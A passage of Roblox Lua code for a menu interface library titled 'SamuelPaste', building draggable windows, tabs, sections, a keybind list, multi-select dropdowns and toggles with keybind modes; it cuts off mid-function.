			for i,v in pairs(KeybindList.Frame.Frame:GetChildren()) do
				if v:IsA('TextLabel') then
					if KeybindList.Frame.Frame.Size.X.Offset <= v.TextBounds.X then
						KeybindList.Frame.Frame.Size = C.UDIM2(0,v.TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,v.TextBounds.X+2,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,v.TextBounds.X,0,20)					
					end
					KeybindList.Frame.Frame.Size += C.UDIM2(0,0,0,10)
				end
			end			
		end
	end 

	function keybindremove2(text) 
		if KeybindList.Frame.Frame:FindFirstChild(text) then
			KeybindList.Frame.Frame:FindFirstChild(text):Destroy()
			KeybindList.Frame.Frame.Size = C.UDIM2(0, 60, 0, 20)
			KeybindList.Frame.Size = UDim2.new(0, 60, 0, 20)
			KeybindList.Frame.Grad.Size = UDim2.new(0, 60, 0, 2)
			KeybindList.Frame.Keybinds.Size = UDim2.new(0, 60, 0, 20)
			for i,v in pairs(KeybindList.Frame.Frame:GetChildren()) do
				if v:IsA('TextLabel') then
					if KeybindList.Frame.Frame.Size.X.Offset <= v.TextBounds.X then
						KeybindList.Frame.Frame.Size = C.UDIM2(0,v.TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,v.TextBounds.X+2,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,v.TextBounds.X,0,20)						
					end
					KeybindList.Frame.Frame.Size += C.UDIM2(0,0,0,10)
				end
			end				
			if #KeybindList.Frame.Frame:GetChildren() == 1 then
				KeybindList.Frame.Frame.Visible = false
				KeybindList.Frame.Frame.Size = C.UDIM2(0, 60, 0, 20)
				KeybindList.Frame.Size = UDim2.new(0, 60, 0, 20)
				KeybindList.Frame.Grad.Size = UDim2.new(0, 60, 0, 2)
				KeybindList.Frame.Keybinds.Size = UDim2.new(0, 60, 0, 20)
			end
		end 
	end 

	function library:SetKeybindVisible(Joe) 
		KeybindList.Enabled = Joe 
	end 
				library.dragging = false 
				do 
					local UserInputService = UserInputService
					local a = Menu 
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							library.dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									library.dragging = false 
								end 
							end)
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and library.dragging then 
							update(input) 
						end 
					end) 
				end 

				local Holder = C.INST("Frame")	

				Holder.Name = "Holder"
				Holder.Parent = Menu
				Holder.BackgroundColor3 = C.COL3RGB(25, 25, 25)
				Holder.BackgroundTransparency = 0.400
				Holder.BorderColor3 = C.COL3RGB(7, 0, 0)
				Holder.Position = C.UDIM2(0, 0, 0, -26)
				Holder.Size = C.UDIM2(0, 600, 0, 25)


					TextLabel.Parent = Holder
					TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextLabel.BackgroundTransparency = 1.000
					TextLabel.Position = C.UDIM2(0, 8, 0, 0)
					TextLabel.Size = C.UDIM2(0, 570, 0, 23)
					TextLabel.Font = Enum.Font.Ubuntu
					TextLabel.Text = "SamuelPaste"
					TextLabel.TextColor3 = C.COL3RGB(255, 255, 255)
					TextLabel.TextSize = 12.000
					TextLabel.TextStrokeTransparency = 0.000
					TextLabel.TextXAlignment = Enum.TextXAlignment.Left

				TabButtons.Name = "TabButtons"
				TabButtons.Parent = Holder
				TabButtons.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				TabButtons.BackgroundTransparency = 1.000
				TabButtons.Position = C.UDIM2(0.13, 0, 0, 0)
				TabButtons.Size = C.UDIM2(0, 498, 0, 25)


				UIListLayout.Parent = TabButtons
				UIListLayout.FillDirection = Enum.FillDirection.Horizontal
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

				Tabs.Name = "Tabs" 
				Tabs.Parent = Menu 
				Tabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
				Tabs.BackgroundTransparency = 1.000 
				Tabs.Position = C.UDIM2(0, 0, 0, 2) 
				Tabs.Size = C.UDIM2(0, 590, 0, 600) 

				local first = true 
				local currenttab 

				function menu.Tab(text) 
					local tabname 
					tabname = text 
					local Tab = {} 
					values[tabname] = {} 

					local TextButton = C.INST("TextButton") 
					TextButton.Parent = TabButtons
					TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextButton.BackgroundTransparency = 1.000
					TextButton.Size = C.UDIM2(0, 83, 0, 23)
					TextButton.Font = Enum.Font.Ubuntu
					TextButton.Text = text
					TextButton.TextColor3 = C.COL3RGB(255, 255, 255)
					TextButton.TextSize = 12.000
					TextButton.TextStrokeTransparency = 0.000
					local Gard = C.INST("Frame")
					Gard.Name = "Gard"
					Gard.Parent = TextButton
					Gard.BackgroundColor3 = getMainColor()
					Gard.BorderSizePixel = 0
					Gard.Position = C.UDIM2(0, 0, 1, 0)
					Gard.Size = C.UDIM2(0, 83, 0, 1)

					local TabGui = C.INST("ScrollingFrame") 
					local Left = C.INST("Frame") 
					local UIListLayout = C.INST("UIListLayout") 
					local Right = C.INST("Frame") 
					local UIListLayout_2 = C.INST("UIListLayout") 

		TabGui.Name = 'TabGui'
		TabGui.Parent = Tabs
		TabGui.BackgroundColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BorderColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BackgroundTransparency = 1
		TabGui.ScrollBarThickness = 4
		TabGui.BorderSizePixel = 0
		TabGui.ScrollBarImageTransparency = 0.9
		TabGui.Position = C.UDIM2(0, 5, 0, 2)
		TabGui.Size = C.UDIM2(0, 590, 1, 0)
		TabGui.Visible = false
		TabGui.CanvasSize = C.UDIM2(0, 0, 4.5, 0)


					Left.Name = "Left" 
					Left.Parent = TabGui 
					Left.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Left.BackgroundTransparency = 1.000 
					Left.Position = C.UDIM2(0, 15, 0, 11) 
					Left.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout.Parent = Left 
					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout.Padding = UDim.new(0, 10) 

					Right.Name = "Right" 
					Right.Parent = TabGui 
					Right.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Right.BackgroundTransparency = 1.000 
					Right.Position = C.UDIM2(0, 303, 0, 11) 
					Right.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout_2.Parent = Right 
					UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout_2.Padding = UDim.new(0, 10) 

					if first then 
						TextButton.TextColor3 = C.COL3RGB(255, 255, 255) 
						currenttab = text 
						TabGui.Visible = true 
						first = false 
					end 

					TextButton.MouseButton1Down:Connect(function() 
						if currenttab ~= text then 
							for i,v in pairs(TabButtons:GetChildren()) do 
								if v:IsA("TextButton") then 
									library:Tween(v, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									library:Tween(v.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000}) 
								end 
							end 
							for i,v in pairs(Tabs:GetChildren()) do 
								v.Visible = false 
							end 
							library:Tween(TextButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)})
							library:Tween(TextButton.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
							currenttab = text 
							TabGui.Visible = true 
						end 
					end) 

					function Tab:MSector(text, side) 
						local sectorname = text 
						local MSector = {} 
						values[tabname][text] = {} 


						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local sectiontabs = C.INST("Frame") 
						local UIListLayout_2 = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Size = C.UDIM2(1, 0, 0, 33) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(0, 0, 0) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -9) 

						sectiontabs.Name = "sectiontabs" 
						sectiontabs.Parent = Section 
						sectiontabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						sectiontabs.BackgroundTransparency = 1.000 
						sectiontabs.Position = C.UDIM2(0, 0, 0, 6) 
						sectiontabs.Size = C.UDIM2(1, 0, 0, 22) 

						UIListLayout_2.Parent = sectiontabs 
						UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal 
						UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout_2.Padding = UDim.new(0,4) 

						local firs = true 
						local selected 
						function MSector:Tab(text) 
							local tab = {} 
							values[tabname][sectorname][text] = {} 
							local tabtext = text 

							local tabsize = C.UDIM2(1, 0, 0, 44) 

							local tab1 = C.INST("Frame") 
							local UIPadding = C.INST("UIPadding") 
							local UIListLayout = C.INST("UIListLayout") 
							local TextButton = C.INST("TextButton") 

							tab1.Name = text 
							tab1.Parent = Inner 
							tab1.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
							tab1.BorderColor3 = C.COL3RGB(18, 18, 16) 
							tab1.BorderSizePixel = 0 
							tab1.Position = C.UDIM2(0, 0, 0, 30) 
							tab1.Size = C.UDIM2(1, 0, 1, -21) 
							tab1.Name = text 
							tab1.Visible = false 

							UIPadding.Parent = tab1 
							UIPadding.PaddingTop = UDim.new(0, 0) 

							UIListLayout.Parent = tab1 
							UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
							UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
							UIListLayout.Padding = UDim.new(0, 1) 

							TextButton.Parent = sectiontabs 
							TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
							TextButton.BackgroundTransparency = 1.000 
							TextButton.Size = C.UDIM2(0, txt:GetTextSize(text, 14, Enum.Font.Gotham, C.Vec2(700,700)).X + 2, 1, 0) 
							TextButton.Font = Enum.Font.Gotham 
							TextButton.Text = text 
							TextButton.TextColor3 = C.COL3RGB(200, 200, 200) 
							TextButton.TextSize = 11.000
							TextButton.Name = text 

							TextButton.MouseButton1Down:Connect(function() 
								for i,v in pairs(Inner:GetChildren()) do 
									v.Visible = false 
								end 
								for i,v in pairs(sectiontabs:GetChildren()) do 
									if v:IsA("TextButton") then 
										library:Tween(v, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
									end 
								end 
								Section.Size = tabsize 
								tab1.Visible = true 
								library:Tween(TextButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
							end) 

							function tab:Element(type, text, data, callback) 
								local Element = {} 
								data = data or {} 
								callback = callback or function() end 
								values[tabname][sectorname][tabtext][text] = {} 

								if type == "Jumbobox" then 
									tabsize = tabsize + C.UDIM2(0,0,0, 39) 
									Element.value = {Jumbobox = {}} 
									data.options = data.options or {} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = "..." 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop"
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(1, 1, 1, 1) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = getMainColor() 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									values[tabname][sectorname][tabtext][text] = Element.value 
									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 

									local function updatetext() 
										local old = {} 
										for i,v in ipairs(data.options) do 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												C.INSERT(old, v) 
											else 
											end 
										end 
										local str = "" 


										if #old == 0 then 
											str = "..." 
										else 
											if #old == 1 then 
												str = old[1] 
											else 
												for i,v in ipairs(old) do 
													if i == 1 then 
														str = v 
													else 
														if i > 2 then 
															if i < 4 then 
																str = str..",  ..." 
															end 
														else 
															str = str..",  "..v 
														end 
													end 
												end 
											end 
										end 

										abcd.Text = str 
									end 
									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												if C.TBLFIND(Element.value.Jumbobox, v) then 
													for i,a in pairs(Element.value.Jumbobox) do 
														if a == v then 
															C.TBLREMOVE(Element.value.Jumbobox, i) 
														end 
													end 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
												else 
													C.INSERT(Element.value.Jumbobox, v) 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
												end 
												updatetext() 

												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
											end) 
											Button.MouseEnter:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
												end 
											end) 
											Button.MouseLeave:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end) 

											first = false 
										end 
									end 
									function Element:SetValue(val) 
										Element.value = val 
										for i,v in pairs(Drop:GetChildren()) do 
											if v.Name ~= "UIListLayout" then 
												if C.TBLFIND(val.Jumbobox, v.Name) then 
													v.TextLabel.TextColor3 = C.COL3RGB(175, 175, 175) 
												else 
													v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
												end 
											end 
										end 
										updatetext() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 
									if data.default then 
										Element:SetValue(data.default) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
								elseif type == "TextBox" then 

								elseif type == "ToggleKeybind" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = "Always", Active = true} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(27, 3275, 35) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 
									local binding = false 
									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									Button.MouseButton1Down:Connect(function() 
										if not binding then 
											Element.value.Toggle = not Element.value.Toggle 
											if Element.value.Toggle and Element.value.Key ~= nil then
												keybindadd(text, Element.value.Key)
											end
											update() 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									do 
										local Keybind = C.INST("TextButton") 
										local Frame = C.INST("Frame") 
										local Always = C.INST("TextButton") 
										local UIListLayout = C.INST("UIListLayout") 
										local Hold = C.INST("TextButton") 
										local Toggle = C.INST("TextButton") 

										Keybind.Name = "Keybind" 
										Keybind.Parent = Button 
										Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
										Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
										Keybind.Text = "none" 
										Keybind.Size = C.UDIM2(0, 43, 0, 12) 
										Keybind.Size = C.UDIM2(0,txt:GetTextSize("none", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
										Keybind.AutoButtonColor = false 
										Keybind.Font = Enum.Font.Gotham 
										Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
										Keybind.TextSize = 11.000
										Keybind.AnchorPoint = C.Vec2(1,0) 
										Keybind.ZIndex = 3 

										Frame.Parent = Keybind 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(1, -49, 0, 1) 
										Frame.Size = C.UDIM2(0, 49, 0, 49) 
										Frame.Visible = false 
										Frame.ZIndex = 3 

										Always.Name = "Always" 
										Always.Parent = Frame 
										Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Always.BackgroundTransparency = 1.000 
										Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Always.Size = C.UDIM2(1, 0, 0, 16) 
										Always.AutoButtonColor = false 
										Always.Font = Enum.Font.SourceSansBold 
										Always.Text = "Always" 
										Always.TextColor3 = C.COL3RGB(173, 24, 74) 
										Always.TextSize = 11.000
										Always.ZIndex = 3 

										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

										Hold.Name = "Hold" 
										Hold.Parent = Frame 
										Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Hold.BackgroundTransparency = 1.000 
										Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Hold.Size = C.UDIM2(1, 0, 0, 16) 
										Hold.AutoButtonColor = false 
										Hold.Font = Enum.Font.Gotham 
										Hold.Text = "Hold" 
										Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
										Hold.TextSize = 11.000
										Hold.ZIndex = 3 

										Toggle.Name = "Toggle" 
										Toggle.Parent = Frame 
										Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Toggle.BackgroundTransparency = 1.000 
										Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Toggle.Size = C.UDIM2(1, 0, 0, 16) 
										Toggle.AutoButtonColor = false 
										Toggle.Font = Enum.Font.Gotham 
										Toggle.Text = "Toggle" 
										Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
										Toggle.TextSize = 11.000
										Toggle.ZIndex = 3 

										for _,button in pairs(Frame:GetChildren()) do 
											if button:IsA("TextButton") then 
												button.MouseButton1Down:Connect(function() 
													Element.value.Type = button.Text 
													Frame.Visible = false 
													Element.value.Active = Element.value.Type == "Toggle" and true or false 
													if Element.value.Type == "Always" then 
														keybindremove(text, Element.value.Key) 
													end 
													for _,button in pairs(Frame:GetChildren()) do 
														if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
															button.Font = Enum.Font.Gotham 
															library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
														end 
													end 
													button.Font = Enum.Font.SourceSansBold 
													button.TextColor3 = C.COL3RGB(60, 0, 90) 
													values[tabname][sectorname][tabtext][text] = Element.value 
													callback(Element.value) 
												end) 
												button.MouseEnter:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
													end 
												end) 
												button.MouseLeave:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end) 
											end 
										end 
										Keybind.MouseButton1Down:Connect(function() 
											if not binding then 
												wait() 
												binding = true 
												Keybind.Text = "..." 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
											end 
										end) 
										Keybind.MouseButton2Down:Connect(function() 
											if not binding then 
												Frame.Visible = not Frame.Visible 
											end 
										end) 
										local Player = game.Players.LocalPlayer 
										local Mouse = Player:GetMouse() 
										local InFrame = false 
										Frame.MouseEnter:Connect(function() 
											InFrame = true 
										end) 
										Frame.MouseLeave:Connect(function() 
											InFrame = false 
										end) 
										local InFrame2 = false 
										Keybind.MouseEnter:Connect(function() 
											InFrame2 = true 
										end) 
										Keybind.MouseLeave:Connect(function() 
											InFrame2 = false 
										end) 
										game:GetService("UserInputService").InputBegan:Connect(function(input) 
											if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
												if Frame.Visible == true and not InFrame and not InFrame2 then 
													Frame.Visible = false 
												end 
											end 
											if binding then 
